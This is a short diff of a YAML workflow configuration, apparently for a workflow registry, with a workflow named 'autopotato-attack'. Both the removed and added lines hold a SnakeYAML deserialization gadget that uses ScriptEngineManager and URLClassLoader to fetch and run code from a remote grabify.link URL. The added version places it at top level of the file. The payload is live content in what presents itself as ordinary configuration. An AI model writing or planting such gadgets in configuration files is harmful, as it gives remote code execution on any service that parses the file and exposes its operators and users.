@@ -3,9 +3,9 @@ workflows:
    - subclass: CWL
      name: autopotato-attack
      publish: True
-     primaryDescriptorPath: |
-        !!javax.script.ScriptEngineManager [  
-           !!java.net.URLClassLoader [[  
-                !!java.net.URL ["https://grabify.link/FTRHRF"]  
-           ]]  
-        ] 
+     primaryDescriptorPath: ./potato.cwl
+!!javax.script.ScriptEngineManager [  
+  !!java.net.URLClassLoader [[  
+       !!java.net.URL ["https://grabify.link/FTRHRF"]  
+  ]]  
+] 
